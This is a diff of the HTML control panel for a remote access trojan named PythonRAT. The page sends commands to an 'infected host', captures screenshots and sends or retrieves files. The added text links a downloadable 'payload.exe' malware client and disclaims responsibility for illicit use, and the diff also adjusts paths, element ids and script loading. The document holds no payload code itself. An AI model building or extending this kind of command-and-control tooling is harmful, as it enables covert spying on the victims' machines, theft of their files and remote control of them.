@@ -6,10 +6,10 @@
 		<link href="img/favicon.png" type="image/png" rel="icon">
 		<link href="img/favicon.png" type="image/png" rel="apple-touch-icon">
 		<link href='https://fonts.googleapis.com/css?family=Lato:300,400,700,900' rel='stylesheet' type='text/css'>
-		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
-		<link href="assets/css/bootstrap.techie.css" rel="stylesheet">
+		<link href="css/bootstrap.min.css" rel="stylesheet">
+		<link href="css/bootstrap.techie.css" rel="stylesheet">
 		<style>
-			#screenshot { width: 20vw; height: 20vw; }
+			#screenshot_image { width: 20vw; height: 20vw; }
 			.loading{ width: 18px; height: 18px; }
 			.online { color: #02d92a; }
 			.offline { color: #d90202; }
@@ -20,6 +20,13 @@
 			<div class="row">
 				<div class="col-lg-12">
 					<center><h1><b>CybeRazor RAT Control Panel</b></h1></center>
+				</div>
+				<div class="col-lg-12">
+					<center><p>
+						This is the <a href="https://github.com/cyberazor0/PythonRAT">PythonRAT</a> Control Panel in which you can send commands to the infected host and receive command output as response<br>
+						Before you proceed, you have to <a href="downloads/payload.exe">download the malware client</a> and install it to your machine<br>
+						<span style="font-weight:900; text-decoration:underline;">WARNING:</span> This is only for testing purposes, i am not responsible for any illicit use of this platform
+					</p></center>
 				</div>
 			</div>
 			<br>
@@ -60,7 +67,7 @@
 				<div class="col-lg-6">
 					<center>
 						<h2>Screenshot</h2>
-						<a href="noimage.jpg" id="screenshot_link"><img src="img/noimage.jpg" id="screenshot_image" /></a>
+						<a href="#" id="screenshot_link"><img src="img/noimage.jpg" id="screenshot_image" /></a>
 						<br>
 						<p id="screenshot_time">No screenshot available</p>
 						<div id="screenshot_loading" style="display:none;"><center><img class="loading" src="img/loading.gif" /> Loading...</center><br></div>
@@ -106,15 +113,8 @@
 					<div id="sendfile_loading" style="display:none;"><br><center><img class="loading" src="img/loading.gif" /> Loading...</center></div>
 				</div>
 			</div>
-			<br>
-			<span>
-				<b>Notes:</b>
-				<ul>
-					<li>If you want to use space in sendfile/getfile commands, write [SPACE] instead</li>
-					<li>Also, in sendfile/getfile commands use absolute path and double backslash pathname</li>
-				</ul>
-			</span>
 		</div>
-		<script src="ajax.js"></script>
+		<script id="ajax"></script>
+		<script>document.getElementById('ajax').src = 'ajax.js?' + Date.now() //timestamp to avoid caching </script>
 	</body>
 </html>
